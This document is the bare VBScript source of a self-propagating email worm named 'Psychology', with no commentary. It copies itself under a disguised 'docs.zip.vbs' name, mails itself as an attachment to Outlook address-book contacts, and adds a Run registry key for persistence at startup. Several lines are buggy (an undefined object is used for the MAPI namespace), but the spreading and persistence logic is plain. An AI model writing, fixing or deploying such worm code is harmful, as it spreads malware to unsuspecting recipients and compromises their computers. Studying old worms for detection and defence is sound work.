On Error Resume Next
'worm name : Psychology
spawn()
sub spawn()
Set s = CreateObject("Scripting.FileSystemObject")
Set f = s.GetFile(wscript.scriptfullname)
f.Copy ("c:\windows\docs.zip.vbs")
end sub
mail()
sub mail()
Set q = CreateObject("Outlook.Application")
Set w = a.GetNameSpace("MAPI")
If q = "Outlook" Then
w.Logon "profile", "password"
For y = 1 To w.AddressLists.Count
Set d = w.AddressLists(y)
x = 1
Set c = q.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 1 Then oo = d.AddressEntries.Count
Next
c.attachments.Add wscript.scriptfullname, 1, 1
c.Send
e = ""
Next
w.Logoff
End If
end sub
reg()
sub reg()
dim j
Set j = CreateObject("WScript.Shell")
j.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\*HLM", wscript.scriptfullname
end sub